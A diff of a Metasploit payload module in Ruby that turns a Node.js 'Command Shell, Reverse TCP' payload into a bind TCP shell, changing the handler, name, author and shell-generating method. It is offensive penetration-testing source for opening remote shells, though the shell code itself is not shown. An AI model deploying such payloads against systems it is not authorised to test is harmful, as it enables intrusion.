@@ -11,7 +11,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/nodejs'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
 module Metasploit3
@@ -22,13 +22,13 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP (via nodejs)',
+      'Name'          => 'Command Shell, Bind TCP (via nodejs)',
       'Description'   => 'Creates an interactive shell via nodejs',
-      'Author'        => ['RageLtMan', 'joev'],
+      'Author'        => ['joev'],
       'License'       => BSD_LICENSE,
       'Platform'      => 'nodejs',
       'Arch'          => ARCH_NODEJS,
-      'Handler'       => Msf::Handler::ReverseTcp,
+      'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::CommandShell,
       'PayloadType'   => 'nodejs',
       'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
@@ -46,6 +46,6 @@ module Metasploit3
   # Returns the JS string to use for execution
   #
   def command_string
-    nodejs_reverse_tcp
+    nodejs_bind_tcp
   end
 end
